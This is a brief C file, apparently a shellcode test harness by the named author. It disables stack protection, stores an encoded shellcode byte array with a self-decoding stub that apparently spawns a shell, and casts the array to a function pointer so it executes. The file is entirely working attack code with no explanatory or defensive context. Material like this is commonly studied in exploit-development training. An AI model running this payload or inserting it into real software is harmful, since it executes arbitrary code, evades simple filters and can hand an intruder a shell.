/*
Filename:	encoder.c
Author:		Jules Adriaens
Compile:	gcc -fno-stack-protector -z execstack -o encoder encoder.c
*/

#include <stdio.h>
#include <string.h>

unsigned char shellcode[] =
"\xeb\x0f\x5e\x31\xc0\xb0\x16\x80\x2e\x0d\xfe\xc8\x74\x08\x46\xeb\xf6\xe8\xec\xff\xff\xff\x3e\xcd\x5d\x96\xef\x75\x3c\x3c\x80\x75\x75\x3c\x6f\x76\x7b\x96\xf0\x5d\xbd\x18\xda\x8d";

int main()
{
	printf("Shellcode Length: %d\n", strlen(shellcode));
	int (*ret)() = (int(*)())shellcode;
	ret();
}
